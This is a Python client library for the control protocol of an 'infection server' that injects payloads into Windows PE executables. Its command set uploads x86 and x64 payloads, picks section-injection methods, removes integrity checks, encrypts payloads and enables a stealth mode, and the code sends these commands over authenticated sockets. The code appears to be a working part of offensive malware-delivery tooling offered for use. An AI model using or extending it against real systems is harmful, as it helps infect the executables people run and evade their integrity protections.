#!/usr/bin/env python3

# import lib
import socket
import struct

# communication: control <-> infection server
#
# 0         1                                5                                             n
# +----------------------------------------------------------------------------------------+
# |         |                                |                                             |
# | command |             length             |                    data                     |
# |         |                                |                                             |
# +----------------------------------------------------------------------------------------+
#
#     command: 1 Byte
#     length from data: 4 Byte
#     data: n Byte
#
class LibPeProtocol:

    # Receive Commands
    CMD_RECEIVE_SUCCESS                  = 0xFD
    CMD_RECEIVE_ERROR                    = 0xFE

    # Send Commands
    CMD_SEND_ECHO                                     = 0x01
    CMD_SEND_RESTART                                  = 0x02
    CMD_SEND_SET_SECTION_NAME                         = 0x03
    CMD_SEND_SET_METHOD_CHANGE_FLAGS                  = 0x04
    CMD_SEND_SET_METHOD_NEW_SECTION                   = 0x05
    CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE              = 0x06
    CMD_SEND_SET_METHOD_ALIGNMENT                     = 0x07
    CMD_SEND_SET_REMOVE_INTEGRITY_CHECK               = 0x08
    CMD_SEND_SET_DATA_PORT                            = 0x09
    CMD_SEND_SET_DATA_INTERFACE                       = 0x0A
    CMD_SEND_SET_CONTROL_PORT                         = 0x0B
    CMD_SEND_SET_CONTROL_INTERFACE                    = 0x0C
    CMD_SEND_SET_PAYLOAD_X86                          = 0x0D
    CMD_SEND_SET_PAYLOAD_X64                          = 0x0E
    CMD_SEND_GET_CONFIG                               = 0x0F
    CMD_SEND_SET_PAYLOAD_NAME_X86                     = 0x10
    CMD_SEND_SET_TRY_STAY_STEALTH                     = 0x11
    CMD_SEND_SET_ENABLE                               = 0x12
    CMD_SEND_SET_RANDOM_SECTION_NAME                  = 0x13
    CMD_SEND_SHUTDOWN                                 = 0x14
    CMD_SEND_SET_PAYLOAD_NAME_X64                     = 0x15
    CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP            = 0x16
    CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS = 0x17
    CMD_SEND_SET_ENCRYPT                              = 0x18
    CMD_SEND_SET_ENCRYPT_ITERATIONS                   = 0x19
    CMD_SEND_SET_TOKEN                                = 0x20

    # Command Type: Boolean (data = 1|0)
    CMD_SEND_PARAM_BOOL = [CMD_SEND_SET_METHOD_CHANGE_FLAGS,
                           CMD_SEND_SET_METHOD_NEW_SECTION,
                           CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE,
                           CMD_SEND_SET_METHOD_ALIGNMENT,
                           CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP,
                           CMD_SEND_SET_REMOVE_INTEGRITY_CHECK,
                           CMD_SEND_SET_DATA_INTERFACE,
                           CMD_SEND_SET_CONTROL_INTERFACE,
                           CMD_SEND_SET_RANDOM_SECTION_NAME,
                           CMD_SEND_SET_TRY_STAY_STEALTH,
                           CMD_SEND_SET_ENABLE,
                           CMD_SEND_SET_ENCRYPT]

    # Command Type: String (data = char-array)
    CMD_SEND_PARAM_STR = [CMD_SEND_SET_SECTION_NAME,
                          CMD_SEND_SET_PAYLOAD_NAME_X86,
                          CMD_SEND_SET_PAYLOAD_NAME_X64]

    # Command Type: Integer (data = int)
    CMD_SEND_PARAM_INT = [CMD_SEND_SET_DATA_PORT,
                          CMD_SEND_SET_CONTROL_PORT,
                          CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS,
                          CMD_SEND_SET_ENCRYPT_ITERATIONS]

    # Command Type: Byte (data = File)
    CMD_SEND_PARAM_BYTE = [CMD_SEND_SET_PAYLOAD_X86,
                           CMD_SEND_SET_PAYLOAD_X64,
                           CMD_SEND_SET_TOKEN]

    # Command Type: Void (no data; length=0)
    CMD_SEND_PARAM_VOID = [CMD_SEND_RESTART,
                           CMD_SEND_SHUTDOWN,
                           CMD_SEND_GET_CONFIG]

    # init
    def __init__(self, token: str, host: str, port: int, timeout: int=3, max_size: int=8192) -> object:
        self.host = host
        self.port = port
        self.timeout = timeout
        self.max_size = max_size
        self.last_error = None
        self.token = b'\xaa\xaa' + 30 * b'\x00'
        self.set_token(token)

    # Get last error description
    def get_last_error(self) -> str:
        return self.last_error

    # Set access token
    def set_token(self, token) -> bool:
        byte_token = bytes.fromhex(token)
        if (len(byte_token) != 32) or (byte_token[:2] != b'\xaa\xaa'):
          return False
        self.token = byte_token
        return True
      
    # Sends command, returns result
    #  return:   None ... error
    #            byte array ... OK (== CMD_RECEIVE_SUCCESS)
    def send_command(self, command, data):
        # Build Payload
        payload = self.token + bytes([command])
        if command in self.CMD_SEND_PARAM_BOOL:
            if type(data) is bool:
                payload += struct.pack("<I?", 1, data)
            else:
                self.last_error = "protocol error: boolean command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_STR:
            if type(data) is str:
                payload += struct.pack("<I", len(data)) + data.encode("ASCII")
            else:
                self.last_error = "protocol error: string command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_INT:
            if type(data) is int:
                payload += struct.pack("<II", 4, data)
            else:
                self.last_error = "protocol error: integer command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_BYTE:
            if type(data) is bytes:
                payload += struct.pack("<I", len(data)) + data
            else:
                self.last_error = "protocol error: byte command: wrong payload type"
                return None

        elif command in self.CMD_SEND_PARAM_VOID:
            if data is None:
                payload += struct.pack("<I", 0)
            else:
                self.last_error = "protocol error: void command: wrong payload type"
                return None

        else:
            self.last_error = "protocol error: unknown command type"
            return None

        # Send command
        # If something goes wrong while network transmission
        try:
            # Open socket
            send_socket = socket.create_connection((self.host, self.port), self.timeout)
            # Send command to server
            if (send_socket is not None) and send_socket.send(payload):
                # Receive from Server
                mem = send_socket.recv(self.max_size)
                # Close socket
                send_socket.close()
                if mem is not None:
                    if len(mem) > 32:
                        if mem[:32] == self.token:
                            if mem[32] == self.CMD_RECEIVE_SUCCESS:
                                # jeeee, SUCCESS!!!!!!
                                return mem[37:] # return response (possibly an empty array)
                            else:
                                self.last_error = "protocol error: not received 'SUCCESS'"
                                return None
                        else:
                            self.last_error = "protocol error: invalid response token"
                            return None
                    else:
                        self.last_error = "protocol error: response to short"
                        return None
                else:
                    self.last_error = "protocol error: server is not responding"
                    return None
            else:
                self.last_error = "protocol error: no connection"
                return None

        except Exception:
            self.last_error = "protocol error: connection exception"
            return None

        # should never happen
        self.last_error = "protocol error: should never happen"
        return None
